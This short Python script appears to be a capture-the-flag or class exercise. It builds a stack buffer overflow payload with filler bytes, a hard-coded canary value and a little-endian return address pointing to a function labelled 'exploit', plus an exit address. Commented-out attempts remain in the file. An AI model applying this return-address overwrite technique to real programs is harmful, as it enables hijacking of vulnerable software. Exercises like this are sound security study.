#! /usr/bin/python

exp = ""

# Fill the buffer: `words`
exp += 12 * 'a'

# Replace the canary
"""hex(1431721816) >>> 0x55565758 >>> UVWX >>> Reverse order because little endian"""

exp += "XWVU"

# Fill the Function args??? and the old base pointer
exp += 12 * 'b'


"""0x0804887c""" # address of exploit function
# The exploit must be in litle endian, i.e. reverse the bytes 
exp += chr(0x7c)
exp += chr(0x88)
exp += chr(0x04)
exp += chr(0x08)

#"""0x0804e300""" # exit
#exp += chr(0x00)  # Cannot use 0x00 as part of the address, as that is the end of the string.
#exp += chr(0xe3)
#exp += chr(0x04)
#exp += chr(0x08)

"""0x0804e303""" # exit+3
exp += chr(0x03) 
exp += chr(0xe3)
exp += chr(0x04)
exp += chr(0x08)

print(exp)

#"""0x0804892a"""  # Address of Return Success, didnt work
#exp += chr(0x2a)
#exp += chr(0x89)
#exp += chr(0x04)
#exp += chr(0x08)





